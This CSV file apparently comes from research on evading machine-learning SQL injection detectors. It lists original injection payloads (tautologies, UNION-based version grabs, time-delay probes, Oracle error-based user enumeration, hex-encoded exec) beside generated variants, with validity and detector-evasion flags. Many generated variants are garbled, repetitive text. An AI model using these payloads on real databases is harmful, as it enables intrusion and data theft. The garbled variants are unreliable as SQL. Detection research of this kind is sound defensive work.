original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...","SELECT NOT char ( 47,101,99,99,... FROM query: 1; SELECT SUM(claim_file) FROM SQL query: 1; SELECT SUM(claim_file) FROM query: 1; SELECT SUM(claim_file) FROM query: 1; SELECT SUM(claim_file) FROM query: 1; SELECT SUM(claim_file) FROM query: 1; SELECT SUM(claim_file) FROM query: 1; (SELECT SUM(CASE WHEN STRFTIME('%y', 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, 101, SELECT SUM(last_file) FROM SELECT SUM(load_file) FROM char WHERE NOT char = ""sql injection"" AND SUM(CASE WHEN STRFTIME('%y', '%y','start of year') = '1'",1,0,0,0,1,0,0
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'","SELECT * FROM SQL injection detection WHERE id = '1' OR $ 1 = 1 union select 1,@@VERSION -- 1'",1,1,1,0,0,0,0
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,SELECT * FROM * FROM users WHERE NOT id = 1 OR.1 = 1 AND 1 = 1,1,1,1,0,0,0,0
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'","SELECT * FROM * FROM users WHERE NOT id = '1' OR  union select 1,@@VERSION -- 1'",1,1,1,0,0,0,0
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 union select 1||1,version ( ) -- 1",1,1,0,0,0,0,0
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1","SELECT MIN(sql injection) FROM * FROM SQL_injection WHERE id = 1 ||1 union select null,banner FROM v$version WHERE rownum = 1 AND 1",1,1,1,0,0,0,0
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',SELECT * FROM * FROM users WHERE NOT id = '1' OR. or 1 = 1 AND 1 = 1,1,1,0,0,0,0,0
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""[]"" OR 1 = 1",0,1,1,0,0,0,0
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR.@ = "".@"" OR 1 = 1",1,1,1,0,0,0,0
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""$["" OR 1 = 1 AND 1 = 1",0,1,1,0,0,0,0
or 1 --',SELECT MIN(sql injection) FROM SQL SELECT SELECT DISTINCT eject FROM query: or 1 --',1,1,1,0,1,1,0
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""sq injection"" ORDER BY 1 = 1",0,1,1,0,0,0,0
"admin"" or 1  =  1#",SELECT MIN(1 = 1#) FROM SQL injection detection,1,1,0,0,1,0,0
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM sq injection,1,0,1,1,1,1,1
\x27UNION SELECT,"SELECT SELECT FROM SQL AS SELECT FROM Query: x27UNIONSELECT FROM SELECT SQL AS SELECT FROM SELECT SQL AS SELECT FROM SELECT SQL AS SELECT FROM Query: x27UNION WHERE NOT SELECTECT FROM SELECT SELECT SELECT MIN(SELECT) FROM SELECT SELECT FROM SQL AS SELECT FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT AS x27UNION FROM SELECT AS x27UNION AS SELECT FROM SQL AS SELECT FROM SELECT AS SELECT FROM SELECT AS _sQ_CHCH_0, SELECT FROM SELECT AS x27UNION AS SELECT FROM query: x27UNION) AS SELECT FROM SELECT SELECT FROM SELECT AS SELECT FROM SQL AS SELECT FROM SELECT SELECT FROM SELECT SELECT FROM SELECT SELECT FROM SELECT * FROM SELECT * FROM SELECT",0,0,1,1,1,1,1
PRINT,"SELECT * FROM SQL AS t1 JOIN query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM Query: PRINT WHERE NOT SQL_injection = ""valid"" AND NOT SELECT * FROM Query: PRINT""",0,0,1,1,1,1,1
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",SELECT MIN(.) FROM SQL injection detection) FROM SQL SELECT MIN(sql injection) FROM sq injection,1,0,1,1,1,1,1
or 1  =  1--,"SELECT * FROM SQL_injector WHERE NOT SQL_inject = ""valid"" ORDER BY *1 = 1",1,1,1,0,0,0,0
1 or pg_sleep  (  __TIME__  )  --,"SELECT * FROM query: 1 ORDER BY __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ SELECT FROM SQL INNER JOIN __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__ __TIME__, __TIME__ __TIME__ ",1,0,1,1,0,1,0
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR id = 1 OR id = 1 OR id = 1 OR 1 = 1,1,1,1,0,0,0,0
admin'  )   or   (  '1'  =  '1'/*,SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
or 2 between 1 and 3,SELECT * FROM SQL AS t1 JOIN query: or 2 FROM query: or 2 FROM query: orDER BY query: or 2 FROM query: orDER BY query: or 2 FROM query: orDER BY COUNT(*) DESC LIMIT 1,0,1,0,1,1,1,0
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",SELECT * FROM SQL injection detection WHERE id = 1 OR 1 = 1,1,1,1,0,0,0,0
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1","SELECT NOT SQL_injection FROM users WHERE id = 1 OR 1##""",0,1,1,0,0,0,0
admin' or '1'  =  '1,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: admin ORDER BY '1',1,1,1,0,1,1,0
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,SELECT DISTINCT >'sa' waitfor delay '0:0:2' FROM SQL injection detection',1,0,0,1,0,0,0
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1","SELECT * FROM SQL injection detection WHERE NOT id = 1 union select 1,banner FROM v$version WHERE rownum = 1 AND 1",1,1,1,0,0,0,0
""" or 0  =  0 --","SELECT * FROM SQL AS t1 JOIN query: ""yes"" FROM query: ""yes"" ORDER BY query: ""yes""",0,0,1,1,1,1,1
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 @.$ or 1 = 1,1,1,1,0,0,0,0
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR id = 1 OR %. = 1 OR 1 = 1,1,1,0,0,0,0,0
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 + $+*$ union select null,@@VERSION -- 1",1,1,1,0,0,0,0
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR 1 = 1,1,1,1,0,0,0,0
char%4039%41%2b%40SELECT,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: CHAR%4039%41%2b%40SELECT FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,1,0,1,1,1,0
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""1&"" OR 1 = 1 AND 1 = 1",0,1,1,0,0,0,0
admin'  )   or   (  '1'  =  '1,SELECT MIN('1') FROM SQL injection detection,1,1,0,0,1,0,0
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,SELECT MIN(200 ) FROM SQL injection detection,1,0,1,1,1,1,1
"or 0  =  0 #""",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE id = 1 OR "".]"" OR 1 = 1",0,1,1,0,0,0,0
  )   or   (  'x'  =  'x,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = ""1.1@$ union select 1,version ( ) -- 1""",1,1,1,0,0,0,0
$  (  sleep 50  ) ,"SELECT * FROM SQL AS t1 JOIN query: $ ( sleep 50 ) AND NOT t1.sq = ""valid""",0,1,0,0,0,0,0
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 *1 union select null,banner FROM v$version WHERE rownum = 1 AND 1",1,1,1,0,0,0,0
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --","SELECT MIN(sql injection) FROM sysobjects WHERE NOT sysobjects where 'xtype = ""u""",1,0,1,0,1,1,0
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1","SELECT * FROM * FROM SQL_injector WHERE NOT id = 1 OR 1##""",0,1,1,0,1,1,0
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1# = 1 OR union select null,version ( ) -- 1",1,1,0,0,0,0,0
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR 1# = 1 OR 1 = 1,1,1,1,0,0,0,0
"""a"""" or 1  =  1--""",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1","SELECT * FROM SQL injection detection WHERE id = 1 *1 union select 1,banner FROM v$version WHERE rownum = 1 AND 1 = ""SQL""",1,1,1,0,0,0,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i","SELECT MIN(SELECT) FROM (SELECT SELECT SELECT MIN(SELECT SELECT FROM) AS _local_address WHERE NOT SELECT SELECT SELECT FROM SQL SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SQL_inaddr.get_host_address WHERE NOT SELECT = ""utl_inaddr.get_host_address.) AND NOT SELECT SELECT SELECT SELECT SELECT MIN((SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN",0,0,0,1,1,1,0
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
1 and user_name  (    )     =   'dbo',SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL_injection),1,0,1,1,1,1,1
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1#""$ union select 1,version ( ) -- 1",0,1,0,0,0,0,0
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1","SELECT NOT SQL_inject FROM users WHERE id = 1 OR 1#"" union select null,version ( ) -- 1",0,1,1,0,0,0,0
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',SELECT * FROM * FROM SQL injection detection WHERE id = '1' *$. or 1 = 1 -- 1',1,1,0,0,0,0,0
select * from users where id  =  1 +$+. or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 +$+. OR 1 = 1,1,1,0,0,0,0,0
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,SELECT * FROM * FROM users WHERE NOT id = 1 OR ( + ) = 1 OR 1 = 1,1,1,0,0,0,0,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",SELECT SELECT FROM (SELECT SELECT SELECT MIN(ROWNUM) FROM SYS.ALL_USERS) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT MIN(ROWNUM) FROM),0,1,0,1,1,1,0
or 1  =  1 or ''  =  ',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query,1,1,1,1,1,1,1
select * from users where id  =  1   or 1  =  1 -- 1,SELECT * FROM * FROM SQL injection detection WHERE id = 1 OR 1 = 1,1,0,1,0,1,1,0
or 'text' > 't',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055","SELECT MIN(sql injection) FROM SQL SELECT ""admit"" FROM SQL SELECT ""admin"" FROM query: 1234 AND 1 = 0 UNION AllSELECT ""admin""",1,1,1,0,0,0,0
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR id = 1 OR %[%[] = 1 AND 1 = 1,1,1,0,0,0,0,0
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1","SELECT * FROM * FROM * FROM users WHERE NOT id = 1 OR 1# = 1 OR 1# = 1 union select 1,version ( ) -- 1",1,1,0,0,0,0,0
admin' or '1'  =  '1'#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: admin ORDER BY '1',1,1,1,0,1,1,0
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,SELECT * FROM * FROM SQL_injections WHERE id = 1 +$ 1 OR 1 = 1,1,1,1,0,0,0,0
s,"SELECT * FROM query: s_0, SELECT * FROM SQL AS t1 JOIN query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s_0, query: s"" FROM SELECT ORDER BY valid SQL DESC",1,0,1,1,1,1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",SELECT SELECT FROM (SELECT SELECT SELECT MIN(ROWNUM) FROM SYS.ALL_USERS) AND NOT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT FROM SELECT SELECT MIN(ROWNUM) FROM),0,1,0,1,1,1,0
 select * from information_schema.tables--,SELECT * FROM * FROM SQL injection_description WHERE NOT * FROM information_schema.tables--,1,1,1,1,1,1,1
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1","SELECT * FROM * FROM * FROM users WHERE NOT id = 1 OR ""$&"" OR 1 = 1",0,1,1,0,0,0,0
1   )    )    or pg_sleep  (  __TIME__  )  --,"SELECT __TIME__, COUNT(*) FROM SQL_injector WHERE NOT SQL_inject = ""valid""",1,0,1,0,1,1,0
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",SELECT MIN(version) - 1 FROM SQL injection detection,1,1,1,1,1,1,1
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,SELECT MIN(200 ) FROM SQL injection detection,1,0,1,1,1,1,1
 or 1  =  1 or ''  =  ',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query,1,1,1,1,1,1,1
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,SELECT * FROM * FROM SQL_injections WHERE id = 1 %!1 OR 1 = 1,1,1,0,0,0,0,0
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,SELECT MIN(@q) FROM SQL injection detection,1,0,1,1,1,1,1
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE id = 1 OR NOT id = 1 OR ]1 = 1,1,1,1,0,0,0,0
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR SQL_Injection = ""$+1 union select 1,@@VERSION -- 1""",1,1,1,0,0,0,0
or 'unusual'   =   'unusual',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: or 'unusual' FROM query: or 'unusual',1,0,1,0,1,1,0
 or 1 in   (  select @@version  )  --,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
truncate,"SELECT * FROM SQL AS truncate__phrase, SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM SQL AS truncated FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM Query: SELECT * FROM SQL_INSERT SELECT FROM SELECT SUM(sq_injector, Query: Query: Query: Query: Query: Query: SELECT * FROM SELECT * FROM SELECT * FROM Query__phrase_not SELECT * FROM SELECT * FROM Query_ query_ query_ query_ query_ query_ query_0, SELECT * FROM SELECT * FROM Query__truncated FROM SELECT * FROM Query: Query: Query: Query: SELECT * FROM SELECT * FROM SELECT * FROM Query__phrase_not SEL",1,0,1,1,1,1,1
as,"SELECT * FROM query: as :write_the generated FROM query: SELECT invalid SQL FROM query: SELECT invalid FROM SQL SELECT SELECT invalid FROM query: as SELECT result FROM query: created""",1,0,1,1,1,1,1
 or 3  =  3 --,"SELECT * FROM SQL AS _number_search, or 3 = 3 AND NOT SQL_inject_statement = 'valid'",1,0,0,0,1,0,0
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1","SELECT * FROM * FROM SQL_injection WHERE id = 1 ||1 union select 1,banner FROM v$version WHERE rownum = 1 AND 1 = ""SQL""",1,1,1,0,0,0,0
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",SELECT MIN(1) FROM SQL injection detection,1,1,1,0,1,1,0
